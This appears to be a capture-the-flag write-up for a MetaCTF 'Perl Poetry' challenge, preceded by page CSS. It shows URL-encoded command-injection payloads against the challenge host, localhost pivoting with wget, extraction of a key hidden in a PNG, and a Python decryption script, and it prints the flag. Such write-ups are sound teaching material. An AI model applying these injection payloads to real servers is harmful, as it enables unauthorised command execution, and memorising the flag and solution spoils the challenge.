<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>

# Perl Poetry Writeup

## Summary
The poetry site is vulnerable to command injection via the URL path. This gives shell access as `santaclaus`. The flag was moved into the Krampus Vault service listening on localhost:5000. The vault encrypts files with a two‑stage XOR scheme using a PRNG and a key hidden at the end of a PNG. By extracting that key and reversing the PRNG, the flag decrypts to:

```
MetaCTF{4w4y_70_7h3_n0r7h_p0l3_v14_lf1_h3_fl3w_b8c9af}
```

## 1) Initial Access: Command Injection
The web server (`main.pl`) reads files directly from the URL path and only blocks `../` and `|...|`. It does **not** block `;`, so the path can be used to append commands.

Example:
```
http://p16mj411.chals.mctf.io/poems/..%3bid%7c
```
This returns the output of `id`, confirming command execution.

## 2) Locate the Vault
Listing `/` shows a vault directory:
```
http://p16mj411.chals.mctf.io/poems/..%3bls%20/%7c
```
`/flag-notice.txt` indicates the flag is hosted by a local service:
```
NOTE! This file has been moved to the Krampus Vault solution running on localhost:5000.
```

## 3) Access the Vault (localhost only)
BusyBox `wget` is available. Use it without `http://`:
```
http://p16mj411.chals.mctf.io/poems/..%3bwget%20-qO-%20127.0.0.1%3A5000%7c
```
This returns an HTML page listing encrypted files (`elf_payroll.txt`, `naughty_nice_list.txt`, `flag.txt`) as hex strings.

## 4) Reverse the Encryption
`vault.pl` (readable from `/krampus-vault/vault.pl`) encrypts files:
1. XOR each byte with a PRNG stream (`generate_num(seed, 256)`).
2. XOR the result with a repeating secret key extracted from `./public/static/krampus.png`.

### 4.1 Extract the PNG Secret Key
Fetch the PNG and examine trailing bytes after the PNG `IEND` chunk. The extra bytes are base64:
```
dmFsaWRfc2VydmljZV9ob2hvaG8=
```
Decoded key:
```
valid_service_hohoho
```

### 4.2 Determine the PRNG
Seeds are derived from the filename:
```
seed = unpack('N', substr($file . '0' x 4, 0, 4))
```
For `flag.txt`, that is `b"flag"` as a 32‑bit big‑endian integer.  
Brute‑forcing a simple 8‑bit LCG shows the stream matches:
```
state = (a * state + c) mod 256
```
with `a ≡ 9 (mod 32)` and `c ≡ 0 (mod 32)` (many equivalent pairs).

## 5) Decrypt the Flag
Let `C` be the hex ciphertext, `K` the key string, and `R` the PRNG byte stream.  
Then:
```
P[i] = C[i] XOR K[i % len(K)] XOR R[i]
```
Decryption yields:
```
MetaCTF{4w4y_70_7h3_n0r7h_p0l3_v14_lf1_h3_fl3w_b8c9af}
```

## Minimal Decrypt Script
```python
from binascii import unhexlify

ct = unhexlify("a49357cfd8fc9a391956529d85df37d740109477672631f9d3d78c522172d972cbfc78c4f1a998201a690582e89f43e055029f457c554d")
key = b"valid_service_hohoho"
seed = int.from_bytes(b"flag", "big") & 0xFF

# One valid LCG pair (any a≡9 mod 32, c≡0 mod 32 works)
a, c = 9, 0
state = seed

pt = bytearray()
for i, b in enumerate(ct):
    state = (a * state + c) & 0xFF
    pt.append(b ^ key[i % len(key)] ^ state)

print(pt.decode())
```

## Flag
```
MetaCTF{4w4y_70_7h3_n0r7h_p0l3_v14_lf1_h3_fl3w_b8c9af}
```
